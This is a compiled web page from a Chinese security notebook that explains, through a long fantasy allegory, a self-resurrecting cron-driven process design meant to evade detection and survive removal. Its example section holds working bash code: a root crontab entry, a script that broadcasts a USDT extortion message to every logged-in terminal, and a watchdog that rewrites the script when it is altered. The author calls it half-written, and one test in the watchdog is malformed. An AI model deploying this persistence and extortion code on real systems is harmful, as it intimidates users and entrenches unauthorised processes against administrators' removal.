import{a as i,c as a,g as n,o as e}from"./app-aBoodkOW.js";const l="/assets/%E6%97%A0%E6%A0%87%E9%A2%98-DgQ8T0x-.png",p={};function h(t,s){return e(),a("div",null,[...s[0]||(s[0]=[n('<h1 id="杀不死的进程" tabindex="-1"><a class="header-anchor" href="#杀不死的进程"><span>杀不死的进程</span></a></h1><h2 id="架构图" tabindex="-1"><a class="header-anchor" href="#架构图"><span>架构图</span></a></h2><p><img src="'+l+`" alt="无标题"></p><h2 id="从概念上分析" tabindex="-1"><a class="header-anchor" href="#从概念上分析"><span>从概念上分析</span></a></h2><blockquote><p>概念阐述：</p><p>如图所示，该架构的巧妙之处在于永远不会死掉的进程，却又是永远会自杀（自动消失）的进程，来无影去无踪</p><p>首先听我讲给你讲一个故事：</p><p>​ 有个老父亲，是个农民（famer），性格非常平庸，能力极强，但是却不作为，一生只为了孩子，一心只想让他的孩子有所作为，他说”平平淡淡才是真“，他具有修仙小说里那种具有通灵的能力的魔法师，能够召唤一个灵魂与自己作战。这个灵魂至少能发挥自己实力的一半，这个灵魂的名字是（beggar）。他祖上跟上位面大族有些交情，但也因为祖上的交情，结实了非常多的仇家。他曾经有两个孩子，但是后来因为祖上继承仇恨的缘故被仇家杀害。父亲伤心欲绝，这是他的亲生骨肉啊！从此祖上继承下来的仇恨已经坐实了，他决心报仇雪恨。</p><p>​ 他觉得自己的人生就止步于次了，放弃了所有准备去自杀，路上遇到一个算卦的。算卦的说他气运是人族的极品，不要让他去自杀，背负着人族的未来。他那时只当时玩笑话。于是算卦的给予了这个老父亲一身法器，给老父亲传授傀儡之术，掌握时间仙术，不过算卦的告诉他，尽量不要使用时间法术进行时间逆流，尽量少的使用复活大法，是要遭到上天嫉妒的，防止被位面法则发现，否则后果自负。</p><p>​ 于是他苦修23年，终于将傀儡之术，复活大法等的仙级仙法练至大成，同样也将通灵法术炼制达成，他先将自己日夜思念的两个孩子使用法术复活。可是这个老父亲感觉到了上天的嫉妒，上天让他的孩子气运减少，或者具有自杀心态，可是他的法术仅仅是大成，没有全部熟练，没有与上天对抗的能力。</p><p>​ 时代的变迁与近现代车轮的旋转碾碎了修仙时代。那个时代一去不复返，因为这个老父亲心愿未了，甘愿放下巨额赌注，与上天作对赌，因为对时间的造诣已经是炉火纯青，他愿向上天再借500年。</p><p>​ 一次次对他孩子的的复活失败，他也掌握了一定的规律，死去的人是不可能复活的，这与大位面法则相悖。</p><p>​ 他有一个男孩一个女孩，其中男孩做了博士（Doctor），工作之后竟然是测试岗位，天天（每个生命周期）重复着这样的工作，一旦出现奇奇怪怪的结果（与理论有差别），他就会想尽一切办法去修正实验的结果，最终寿归正寝。另外一个孩子是个女孩，学术层次上没什么造诣，却非常喜欢贪玩，天天想着给别人捣乱（customer command），因为他继承了父亲（famer）聪明的才智，从来没有被抓到过，却惹得别人（user）讨厌，她的职业是啦啦队队员。因为圈内乱象横生，而她天生美丽，经常被其他的啦啦队队员嫉妒，甚至性骚扰，一旦她做的坏事被发现，就会启动自杀机制，她把事情的原由打电话告诉父亲之后，从天台一跃而下（主动自杀）。</p><p>​ 老父亲这时叹了一口气，因为这是她不知道接到多少个女儿自杀的电话了。也使用非常多次的重生打法去复活他的女儿。对于他的儿子，他还是比女儿复活的更成功的，虽然气运很差，但是总会都是寿归正寝。</p><p>​ 老父亲只能默默承受着仇家的反对和上天的嫉妒。</p><p>故事讲完了！灵感来源于生活，生态和生命，你理解了吗？下面我会详细讲解</p><p>架构的特点是，各组件所担任的角色会自杀，然后从操作系统中消失，难以追踪。有自愈机制，孩子被杀死（自杀或者故意杀害）之后，父亲经过一段时间的发育，会自动产生下一代。父亲与他的影子组件beggar，形影不离，互相可为下一代。</p><p>从宏观角度来讲，该程序具有完成的两个闭环生态，分为大外环和小内环，几个组件交替完成生命周期。</p><ul><li>大外环： 正常的生育和自杀，完成生命周期</li><li>小内环： 两个影子父亲互相取代对方。完成老父亲的生命周期</li></ul><p>从微观角度来讲，这个架构一共有5个元素和一些操作组成，各组件产生下一代，执行任务，然后完成自杀。</p><p>crontab： 系统定时服务</p><p>cheerleading: 该程序主要实现在系统中执行某个程序；使命完成或未完成后后将会产生自杀心态，将心态告诉父亲（famer）之后；完成自杀。</p><p>famer: 生孩子，不停的生；哪个死了生哪个，不顾一起维护孩子的生命健康；通灵，自己和灵魂可以合为一体，互相继承。</p><p>Doctor: 维护生命轮回，防止下一个轮回不生效，启动自然死亡状态</p><p>beggar: 通灵术，与famer共同施展，互相医治，相濡以沫。</p></blockquote><h2 id="从生命周期去分析" tabindex="-1"><a class="header-anchor" href="#从生命周期去分析"><span>从生命周期去分析</span></a></h2><blockquote><p>大前提： 第一个大环生命周期是成功的</p></blockquote><p>首先<code>crontab</code>启动进程，每1分钟call一下 <code>cheerleading</code>,她会上台表演，执行自定义命令，<code>cheerleading</code>表演完成后会休息<code>5</code>秒。</p><p><code>cheerleading</code>会在生命的最后一颗call她父亲<code>famer</code>,告诉他她要死掉了，</p><p><code>famer</code>启动进程，施展生命法则，在第<code>45</code>秒将<code>cheerleading</code>复活</p><p><code>famer</code>在第<code>50</code>秒检查他儿子<code>doctor</code>的存活和健康情况，如果死亡则实战生命法则</p><p><code>famer</code>在第<code>57</code>秒告诉儿子<code>doctor</code>的使命和任务是什么，一般为固定任务【父亲此时继续执行生命周期】</p><p><code>doctor</code>接到父亲<code>famer</code>命令，开始检查<code>crontab</code>的健康状态，如果不健康启动医生<code>doctor</code>角色，进行修复；如果健康，<code>doctor</code>什么都不干，生命枯竭死亡。</p><p><code>famer</code> 在第 <code>58</code> 秒检查<code>cheerleading</code> 情况 ，如果不健康启动医生<code>doctor</code>角色，进行修复；</p><p><code>famer</code> 在第 <code>59</code> 秒检查<code>doctor</code> 情况 ，如果不健康启动医生<code>doctor</code>角色，进行修复；</p><p><code>famer</code> 上一步执行完成之后直接进入通灵状态 ，本体因为通灵自杀死亡， <code>beggar</code>接管生命；</p><p><code>beggar</code>接管生命，接着对<code>famer</code> 进行修复，修复完成后自然死亡。<strong>此时第二个周期开始，<code>cheerleading</code>开始表演</strong></p><p><code>cheerleading</code>表演完成后会休息<code>5</code>秒,<strong>然后如第二步所示，call她父亲<code>famer</code>,告诉他她要死掉了，</strong></p><p>回到第三步</p><p>······</p><h2 id="对于老父亲灵魂体状态的解释" tabindex="-1"><a class="header-anchor" href="#对于老父亲灵魂体状态的解释"><span>对于老父亲灵魂体状态的解释</span></a></h2><p>防止其他工具检测到<code>长时间进程运行</code></p><p>可以用于程序的初始化</p><p>可以用于第三方程序的调用产生其他你想做的事</p><h2 id="存在的风险" tabindex="-1"><a class="header-anchor" href="#存在的风险"><span>存在的风险</span></a></h2><ul><li><p>在维护模式下删除定时任务生态将会被打乱。</p><p>解决思路： 增加一个系统调用去召唤老父亲的灵魂。使用灵魂体恢复一切。</p></li><li><p>其他还没想到的问题。。。。</p></li></ul><h2 id="例子" tabindex="-1"><a class="header-anchor" href="#例子"><span>例子</span></a></h2><blockquote><p>写了一半了，后面懒得写</p></blockquote><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">root@MACOS:~#</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> ipsync</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[ 2022年 12月 15日 星期四 13:07:56 CST ] When you receive this message, you have been hacked, please prepare USDT. We will protect your computer.  Otherwise you will get consequences you don</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&#39;t want to see.</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">root@MACOS:~# cat /bin/ipsync</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">#!/bin/bash</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">w | grep pts &amp;&gt;/dev/null</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">#echo $?</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">if [ $? != 0 ]</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">then</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        exit 0</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">fi</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">for pts_sum in \`w | grep pts | awk &#39;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">{</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">print</span><span style="--shiki-light:#383A42;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;"> $2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">}&#39;\`</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">do</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">         echo -e &quot;[ $(date) ] \\033[32mWhen you receive this message, you have been\\033[31m hacked\\033[32m, please prepare USDT. We will protect your computer.\\033[42;37m \\033[31m Otherwise you will get consequences you don&#39;t</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> want</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> to</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> see.</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\0</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">33[0m&quot; &gt; /dev/</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379;">\${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">pts_sum</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379;">}</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">done</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">root@MACOS:/var/spool/cron/crontabs# cat root</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"># DO NOT EDIT THIS FILE - edit the master and reinstall.</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"># (/tmp/crontab.T9JHGn/crontab installed on Thu Dec 15 13:14:23 2022)</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"># (Cron version -- </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$Id</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">: crontab.c,v 2.13 1994/01/17 03:20:37 vixie Exp $)</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"># Edit this file to introduce tasks to be run by cron.</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">#</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"># Each task to run has to be defined through a single line</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"># indicating with different fields when the task will be run</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"># and what command to run for the task</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">#</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"># To define the time you can provide concrete values for</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"># minute (m), hour (h), day of month (dom), month (mon),</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"># and day of week (dow) or use &#39;*&#39; in these fields (for &#39;any&#39;).</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">#</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"># Notice that tasks will be started based on the cron&#39;s system</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"># daemon&#39;s notion of time and timezones.</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">#</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"># Output of the crontab jobs (including errors) is sent through</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"># email to the user the crontab file belongs to (unless redirected).</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">#</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"># For example, you can run a backup of all your user accounts</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"># at 5 a.m every week with:</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"># 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">#</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"># For more information see the manual pages of crontab(5) and cron(8)</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">#</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"># m h  dom mon dow   command</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">*/1 * * * * ipsync</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">*/1 * * * * date &gt;&gt; /root/time ;echo sleep63 &gt;&gt; /root/time ;sleep 63 ; echo &quot;already</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> sleep</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 63</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot; &gt;&gt; /root/time</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code class="language-bash"><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">#!/bin/bash</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># sys-ip</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sleep</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">isyncp_sum_elder</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">\`</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">md5sum</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /bin/ipsync </span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> awk</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;{print $1}&#39;\`</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">isyncp_sum</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">\`</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">md5sum</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /bin/ipsync </span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> awk</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;{print $1}&#39;\`</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [ </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$isyncp_sum_elder</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> -nq </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$isyncp_sum</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> ]</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">then</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">cat</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> &gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">/bin/ipsync</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&lt;&lt;-</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">EOF</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">#!/bin/bash</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">w | grep pts &amp;&gt;/dev/null</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">#echo </span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">$?</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">if [ </span><span style="--shiki-light:#E45649;--shiki-dark:#E5C07B;">$?</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> != 0 ]</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">then</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">        exit 0</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">fi</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">for pts_sum in \`</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">w</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> |</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> grep</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> pts </span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">|</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> awk</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &#39;{print $2}&#39;\`</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">do</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">         echo -e &quot;[ $(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">date</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">) ] \\033[32mWhen you receive this message, you have been\\033[31m hacked\\033[32m, please prepare USDT. We will protect your computer.\\033[42;37m \\033[31m Otherwise you will get consequences you don&#39;t want to see.\\033[0m&quot; &gt; /dev/</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379;">\${</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">pts_sum</span><span style="--shiki-light:#E45649;--shiki-dark:#98C379;">}</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">done</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">EOF</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">chmod</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 755</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> /bin/ipsync</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">fi</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sleep</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 5</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,30)])])}const r=i(p,[["render",h]]),k=JSON.parse('{"path":"/note-book/Security/%E6%9D%80%E4%B8%8D%E6%AD%BB%E7%9A%84%E8%BF%9B%E7%A8%8B.html","title":"杀不死的进程","lang":"zh-CN","frontmatter":{"title":"杀不死的进程","date":"2023-07-07T00:00:00.000Z","category":"网络安全","head":[["meta",{"name":"keywords","content":"网络安全"}]],"feed":false,"seo":false},"git":{"createdTime":1691939318000,"updatedTime":1719247892000,"contributors":[{"name":"Paper-Dragon","username":"Paper-Dragon","email":"2678885646@qq.com","commits":2,"url":"https://github.com/Paper-Dragon"},{"name":"PaperDragon-SH","username":"PaperDragon-SH","email":"2678885646@qq.com","commits":2,"url":"https://github.com/PaperDragon-SH"}],"changelog":[{"hash":"f9e9cd43af1851b97ff5682e46c6a4df1424c193","time":1719247892000,"email":"2678885646@qq.com","author":"Paper-Dragon","message":"新开安全目录"},{"hash":"dcc5afc783afbb65df491d9def53ac30acb04817","time":1710837110000,"email":"2678885646@qq.com","author":"PaperDragon-SH","message":"zabbix规范化标题"},{"hash":"cff3053ea922eaa71dff99fe4862e2b150e8d520","time":1697513393000,"email":"2678885646@qq.com","author":"PaperDragon-SH","message":"更新和修复安全问题"},{"hash":"392a519398b2e846f316619fbe831e100164de7c","time":1691939318000,"email":"2678885646@qq.com","author":"Paper-Dragon","message":"Create The Worid!"}]},"readingTime":{"minutes":8.04,"words":2413},"filePathRelative":"note-book/Security/杀不死的进程.md"}');export{r as comp,k as data};
